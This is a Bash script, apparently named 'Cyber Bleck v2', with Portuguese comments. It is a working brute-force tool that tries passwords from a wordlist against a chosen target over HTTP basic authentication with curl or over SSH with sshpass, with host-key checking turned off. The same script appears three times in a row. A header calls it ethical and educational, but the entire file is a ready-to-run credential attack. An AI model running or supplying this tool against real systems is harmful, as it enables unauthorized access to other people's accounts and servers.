#!/bin/bash
# ===============================================
# Cyber Bleck v2 - Script de Brute Force Ético
# Desenvolvido para uso educacional e ético
# Utilize apenas com permissão em ambientes controlados!
# ===============================================

# ===============================================
# CONFIGURAÇÕES INICIAIS
# ===============================================
TARGET=""            # URL ou endereço IP do alvo
USER=""              # Nome do usuário para autenticação
PASSWORD_FILE=""     # Caminho do arquivo de senhas
MODE=""              # Modo de ataque: http ou ssh

# ===============================================
# FUNÇÕES
# ===============================================

# Exibe o uso correto do script
function exibir_uso() {
  echo "Uso: $0 -t TARGET -u USER -p PASSWORD_FILE -m MODE"
  echo " -t TARGET       URL ou IP do alvo (ex.: http://site.com ou 192.168.1.1)"
  echo " -u USER         Nome do usuário para autenticação"
  echo " -p PASSWORD_FILE Arquivo contendo as senhas, uma por linha"
  echo " -m MODE         Modo de ataque: 'http' para autenticação HTTP ou 'ssh' para SSH"
  exit 1
}

# Verifica se o arquivo de senhas existe
function verificar_arquivo() {
  if [ ! -f "$PASSWORD_FILE" ]; then
    echo "[ERRO] Arquivo de senhas '$PASSWORD_FILE' não encontrado. Saindo..."
    exit 1
  fi
}

# Realiza ataque de brute force em autenticação HTTP básica
function brute_force_http() {
  echo "=== Cyber Bleck - Modo HTTP ==="
  echo "Alvo: $TARGET | Usuário: $USER"
  while read -r PASSWORD; do
    echo "[Tentando] Senha: $PASSWORD"
    STATUS_CODE=$(curl -s -o /dev/null -w "%{http_code}" -u "$USER:$PASSWORD" "$TARGET")
    if [ "$STATUS_CODE" == "200" ]; then
      echo "[SUCESSO] Senha encontrada: $PASSWORD"
      exit 0
    fi
  done < "$PASSWORD_FILE"
  echo "[FALHA] Nenhuma senha válida encontrada."
}

# Realiza ataque de brute force em autenticação SSH
function brute_force_ssh() {
  echo "=== Cyber Bleck - Modo SSH ==="
  echo "Alvo: $TARGET | Usuário: $USER"
  while read -r PASSWORD; do
    echo "[Tentando] Senha: $PASSWORD"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no $USER@$TARGET exit &>/dev/null
    if [ $? -eq 0 ]; then
      echo "[SUCESSO] Senha encontrada: $PASSWORD"
      exit 0
    fi
  done < "$PASSWORD_FILE"
  echo "[FALHA] Nenhuma senha válida encontrada."
}

# ===============================================
# PROCESSAR ARGUMENTOS
# ===============================================
while getopts "t:u:p:m:" opt; do
  case $opt in
    t) TARGET=$OPTARG ;;
    u) USER=$OPTARG ;;
    p) PASSWORD_FILE=$OPTARG ;;
    m) MODE=$OPTARG ;;
    *) exibir_uso ;;
  esac
done

# Validar se todos os argumentos foram fornecidos
if [ -z "$TARGET" ] || [ -z "$USER" ] || [ -z "$PASSWORD_FILE" ] || [ -z "$MODE" ]; then
  exibir_uso
fi

# ===============================================
# EXECUÇÃO
# ===============================================
verificar_arquivo

if [ "$MODE" == "http" ]; then
  brute_force_http
elif [ "$MODE" == "ssh" ]; then
  brute_force_ssh
else
  echo "[ERRO] Modo inválido. Use 'http' ou 'ssh'."
  exibir_uso
fi
#!/bin/bash
# ===============================================
# Cyber Bleck v2 - Script de Brute Force Ético
# Desenvolvido para uso educacional e ético
# Utilize apenas com permissão em ambientes controlados!
# ===============================================

# ===============================================
# CONFIGURAÇÕES INICIAIS
# ===============================================
TARGET=""            # URL ou endereço IP do alvo
USER=""              # Nome do usuário para autenticação
PASSWORD_FILE=""     # Caminho do arquivo de senhas
MODE=""              # Modo de ataque: http ou ssh

# ===============================================
# FUNÇÕES
# ===============================================

# Exibe o uso correto do script
function exibir_uso() {
  echo "Uso: $0 -t TARGET -u USER -p PASSWORD_FILE -m MODE"
  echo " -t TARGET       URL ou IP do alvo (ex.: http://site.com ou 192.168.1.1)"
  echo " -u USER         Nome do usuário para autenticação"
  echo " -p PASSWORD_FILE Arquivo contendo as senhas, uma por linha"
  echo " -m MODE         Modo de ataque: 'http' para autenticação HTTP ou 'ssh' para SSH"
  exit 1
}

# Verifica se o arquivo de senhas existe
function verificar_arquivo() {
  if [ ! -f "$PASSWORD_FILE" ]; then
    echo "[ERRO] Arquivo de senhas '$PASSWORD_FILE' não encontrado. Saindo..."
    exit 1
  fi
}

# Realiza ataque de brute force em autenticação HTTP básica
function brute_force_http() {
  echo "=== Cyber Bleck - Modo HTTP ==="
  echo "Alvo: $TARGET | Usuário: $USER"
  while read -r PASSWORD; do
    echo "[Tentando] Senha: $PASSWORD"
    STATUS_CODE=$(curl -s -o /dev/null -w "%{http_code}" -u "$USER:$PASSWORD" "$TARGET")
    if [ "$STATUS_CODE" == "200" ]; then
      echo "[SUCESSO] Senha encontrada: $PASSWORD"
      exit 0
    fi
  done < "$PASSWORD_FILE"
  echo "[FALHA] Nenhuma senha válida encontrada."
}

# Realiza ataque de brute force em autenticação SSH
function brute_force_ssh() {
  echo "=== Cyber Bleck - Modo SSH ==="
  echo "Alvo: $TARGET | Usuário: $USER"
  while read -r PASSWORD; do
    echo "[Tentando] Senha: $PASSWORD"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no $USER@$TARGET exit &>/dev/null
    if [ $? -eq 0 ]; then
      echo "[SUCESSO] Senha encontrada: $PASSWORD"
      exit 0
    fi
  done < "$PASSWORD_FILE"
  echo "[FALHA] Nenhuma senha válida encontrada."
}

# ===============================================
# PROCESSAR ARGUMENTOS
# ===============================================
while getopts "t:u:p:m:" opt; do
  case $opt in
    t) TARGET=$OPTARG ;;
    u) USER=$OPTARG ;;
    p) PASSWORD_FILE=$OPTARG ;;
    m) MODE=$OPTARG ;;
    *) exibir_uso ;;
  esac
done

# Validar se todos os argumentos foram fornecidos
if [ -z "$TARGET" ] || [ -z "$USER" ] || [ -z "$PASSWORD_FILE" ] || [ -z "$MODE" ]; then
  exibir_uso
fi

# ===============================================
# EXECUÇÃO
# ===============================================
verificar_arquivo

if [ "$MODE" == "http" ]; then
  brute_force_http
elif [ "$MODE" == "ssh" ]; then
  brute_force_ssh
else
  echo "[ERRO] Modo inválido. Use 'http' ou 'ssh'."
  exibir_uso
fi
#!/bin/bash
# ===============================================
# Cyber Bleck v2 - Script de Brute Force Ético
# Desenvolvido para uso educacional e ético
# Utilize apenas com permissão em ambientes controlados!
# ===============================================

# ===============================================
# CONFIGURAÇÕES INICIAIS
# ===============================================
TARGET=""            # URL ou endereço IP do alvo
USER=""              # Nome do usuário para autenticação
PASSWORD_FILE=""     # Caminho do arquivo de senhas
MODE=""              # Modo de ataque: http ou ssh

# ===============================================
# FUNÇÕES
# ===============================================

# Exibe o uso correto do script
function exibir_uso() {
  echo "Uso: $0 -t TARGET -u USER -p PASSWORD_FILE -m MODE"
  echo " -t TARGET       URL ou IP do alvo (ex.: http://site.com ou 192.168.1.1)"
  echo " -u USER         Nome do usuário para autenticação"
  echo " -p PASSWORD_FILE Arquivo contendo as senhas, uma por linha"
  echo " -m MODE         Modo de ataque: 'http' para autenticação HTTP ou 'ssh' para SSH"
  exit 1
}

# Verifica se o arquivo de senhas existe
function verificar_arquivo() {
  if [ ! -f "$PASSWORD_FILE" ]; then
    echo "[ERRO] Arquivo de senhas '$PASSWORD_FILE' não encontrado. Saindo..."
    exit 1
  fi
}

# Realiza ataque de brute force em autenticação HTTP básica
function brute_force_http() {
  echo "=== Cyber Bleck - Modo HTTP ==="
  echo "Alvo: $TARGET | Usuário: $USER"
  while read -r PASSWORD; do
    echo "[Tentando] Senha: $PASSWORD"
    STATUS_CODE=$(curl -s -o /dev/null -w "%{http_code}" -u "$USER:$PASSWORD" "$TARGET")
    if [ "$STATUS_CODE" == "200" ]; then
      echo "[SUCESSO] Senha encontrada: $PASSWORD"
      exit 0
    fi
  done < "$PASSWORD_FILE"
  echo "[FALHA] Nenhuma senha válida encontrada."
}

# Realiza ataque de brute force em autenticação SSH
function brute_force_ssh() {
  echo "=== Cyber Bleck - Modo SSH ==="
  echo "Alvo: $TARGET | Usuário: $USER"
  while read -r PASSWORD; do
    echo "[Tentando] Senha: $PASSWORD"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no $USER@$TARGET exit &>/dev/null
    if [ $? -eq 0 ]; then
      echo "[SUCESSO] Senha encontrada: $PASSWORD"
      exit 0
    fi
  done < "$PASSWORD_FILE"
  echo "[FALHA] Nenhuma senha válida encontrada."
}

# ===============================================
# PROCESSAR ARGUMENTOS
# ===============================================
while getopts "t:u:p:m:" opt; do
  case $opt in
    t) TARGET=$OPTARG ;;
    u) USER=$OPTARG ;;
    p) PASSWORD_FILE=$OPTARG ;;
    m) MODE=$OPTARG ;;
    *) exibir_uso ;;
  esac
done

# Validar se todos os argumentos foram fornecidos
if [ -z "$TARGET" ] || [ -z "$USER" ] || [ -z "$PASSWORD_FILE" ] || [ -z "$MODE" ]; then
  exibir_uso
fi

# ===============================================
# EXECUÇÃO
# ===============================================
verificar_arquivo

if [ "$MODE" == "http" ]; then
  brute_force_http
elif [ "$MODE" == "ssh" ]; then
  brute_force_ssh
else
  echo "[ERRO] Modo inválido. Use 'http' ou 'ssh'."
  exibir_uso
fi
